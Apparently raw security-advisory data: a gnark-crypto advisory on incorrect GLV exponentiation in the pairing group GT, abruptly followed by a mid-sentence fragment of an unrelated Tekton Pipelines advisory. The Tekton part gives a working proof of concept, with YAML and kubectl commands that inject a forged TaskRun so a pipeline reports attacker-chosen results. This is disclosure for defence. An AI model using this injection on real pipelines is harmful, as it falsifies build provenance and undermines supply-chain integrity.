            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>When the exponent is bigger than <code>r</code>, the group order of the pairing target group <code>GT</code>, the exponentiation à la GLV (<code>ExpGLV</code>) can <em>sometimes</em> give incorrect results compared to normal exponentiation (<code>Exp</code>). </p>\n<p>The issue impacts all users using <code>ExpGLV</code> for exponentiations in <code>GT</code>. This does not impact <code>Exp</code> and <code>ExpCyclotomic</code> which are sound. Also note that GLV methods in G1 and G2 are sound and <em>not</em> impacted.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Fix has been implemented in pull request <a href=\"https://github.com/Consensys/gnark-crypto/pull/451\">https://github.com/Consensys/gnark-crypto/pull/451</a> and merged in commit <a href=\"https://github.com/Consensys/gnark-crypto/commit/ec6be1a037f7c496d595c541a8a8d31c47bcfa3d\">https://github.com/Consensys/gnark-crypto/commit/ec6be1a037f7c496d595c541a8a8d31c47bcfa3d</a> to master branch.</p>\n<p>The fix increased the bounds of the sub-scalars by 1. In fact, since <a href=\"https://github.com/Consensys/gnark-crypto/pull/213\">https://github.com/Consensys/gnark-crypto/pull/213</a>, we use a fast scalar decomposition that tradeoffs divisions (needed in the Babai rounding) by right-shifts. We precompute <code>b=2^m*v/d (m &gt; log2(d))</code> and then at runtime compute <code>scalar*b/2^m</code> (<code>v</code> is a lattice vector and <code>d</code> the lattice determinant). This increases the bounds on sub-scalars by 1 which we check at runtime before increasing the loop size (we don't target constant-timeness). <code>m</code> is chosen to be a machine word twice big than <code>log2(d)</code> so that we rarely need to increase the loop size. Hence why the issue happens only <em>sometimes</em> if we omit to increase the bounds. This bounds increase was implemented in G1 and G2 but forgot in GT.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Updating to <code>v0.12.1+</code>. Alternatively, use <code>Exp</code> or <code>ExpCyclotomic</code> instead. We are not aware of any users using <code>ExpGLV</code> anyway.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>Fix PR: <a href=\"https://github.com/Consensys/gnark-crypto/pull/451\">https://github.com/Consensys/gnark-crypto/pull/451</a> </li>\n<li>Fast scalar decomposition PR: <a href=\"https://github.com/Consensys/gnark-crypto/pull/213\">https://github.com/Consensys/gnark-crypto/pull/213</a></li>\n<li><a href=\"https://eprint.iacr.org/2015/565\">https://eprint.iacr.org/2015/565</a> Sec.4.2</li>\n</ul>\n<h3 id=\"acknowledgement\">Acknowledgement</h3>\n<p>The vulnerability was reported by <a href=\"https://github.com/asanso\">Antonio Sanso</a> @ <a href=\"https://crypto.ethereum.org/\">EF</a>.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/Consensys/gnark-crypto/security/advisories/GHSA-pffg-92cg-xf5c\">https://github.com/Consensys/gnark-crypto/security/advisories/GHSA-pffg-92cg-xf5c</a></li>\n<li><a href=\"https://github.com/Consensys/gnark-crypto/pull/213\">https://github.com/Consensys/gnark-crypto/pull/213</a></li>\n<li><a href=\"https://github.com/Consensys/gnark-crypto/pull/451\">https://github.com/Consensys/gnark-crypto/pull/451</a></li>\n<li><a href=\"https://github.com/Consensys/gnark-crypto/commit/ec6be1a037f7c496d595c541a8a8d31c47bcfa3d\">https://github.com/Consensys/gnark-crypto/commit/ec6be1a037f7c496d595c541a8a8d31c47bcfa3d</a></li>\n<li><a href=\"https://eprint.iacr.org/2015/565\">https://eprint.iacr.org/2015/565</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pffg-92cg-xf5c\">https://github.com/advisories/GHSA-pffg-92cg-xf5c</a></li>\n</ul>\n",

This is problematic since it can let users modify the config of Pipelines at runtime, which violates SLSA L2 Service Generated / Non-falsifiable requirements.</p>\n<p>I believe this is also true for <a href=\"https://github.com/tektoncd/pipeline/blob/0b8349b770a76877051c9c790c94bf9ed897c75c/test/pipelinerun_test.go#L992\">TaskRuns -&gt; Pods since it looks like we only lookup by name</a>, though I haven't tested this.</p>\n<p>If you have update permissions on tekton resources, you could also perform a similar bypass like this (because it's difficult to distinguish this from a Task retry). For now, I think relying on RBAC is fine and treat update as a privileged role (though we should perhaps update docs to stress this). Create is the most problematic for now. SPIFFE/SPIRE might be able to help with ensuring that only the controller can modify state long term (e.g. sign the expected UIDs?)</p>\n<h3 id=\"poc\">PoC</h3>\n<pre><code class=\"language-yaml\">apiVersion: [tekton.dev/v1beta1](http://tekton.dev/v1beta1)\nkind: PipelineRun\nmetadata:\n  name: hello-pr\nspec:\n  pipelineSpec:\n    tasks:\n      - name: task1\n        taskSpec:\n          steps:\n            - name: echo\n              image: [distroless.dev/alpine-base](http://distroless.dev/alpine-base)\n              script: |\n                sleep 60\n      - name: task2\n        runAfter: [task1]\n        taskSpec:\n          steps:\n            - name: echo\n              image: [distroless.dev/alpine-base](http://distroless.dev/alpine-base)\n              script: |\n                echo \"asdf\" &gt; $(results.foo.path)\n          results:\n            - name: foo\n    results:\n      - name: foo\n        value: $(tasks.task2.results.foo)\n</code></pre>\n<p>Once this is running, grab the PR UID:</p>\n<pre><code class=\"language-sh\">$ k get pr hello-pr -o json | jq .metadata.uid -r\n</code></pre>\n<p>While pipeline is running task 1, start fake task 2:</p>\n<pre><code class=\"language-yaml\">apiVersion: [tekton.dev/v1beta1](http://tekton.dev/v1beta1)\nkind: TaskRun\nmetadata:\n  annotations:\n  labels:\n    [app.kubernetes.io/managed-by](http://app.kubernetes.io/managed-by): tekton-pipelines\n    [tekton.dev/memberOf](http://tekton.dev/memberOf): tasks\n    [tekton.dev/pipeline](http://tekton.dev/pipeline): hello-pr\n    [tekton.dev/pipelineRun](http://tekton.dev/pipelineRun): hello-pr\n    [tekton.dev/pipelineTask](http://tekton.dev/pipelineTask): task2\n  name: hello-pr-task2\n  namespace: default\n  ownerReferences:\n  - apiVersion: [tekton.dev/v1beta1](http://tekton.dev/v1beta1)\n    blockOwnerDeletion: true\n    controller: true\n    kind: PipelineRun\n    name: hello-pr\n    uid: af549647-4532-468b-90c5-29122a408f8d &lt;--- this should be UID of PR fetched in last step\nspec:\n  serviceAccountName: default\n  taskSpec:\n    results:\n    - name: foo\n      type: string\n    steps:\n    - image: [distroless.dev/alpine-base](http://distroless.dev/alpine-base)\n      name: echo\n      resources: {}\n      script: |\n        echo \"zxcv\" &gt; $(results.foo.path)\n</code></pre>\n<p>Get pipeline results - it shows the output of the 2nd injected TaskRun</p>\n<pre><code>$ k get pr -o json hello-pr | jq .status.pipelineResults\n[\n  {\n    \"name\": \"foo\",\n    \"value\": \"zxcv\\n\"\n  }\n]\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>This can be used to trick the Pipeline controller into associating unrelated Runs to the Pipeline, feeding its data through the rest of the Pipeline.
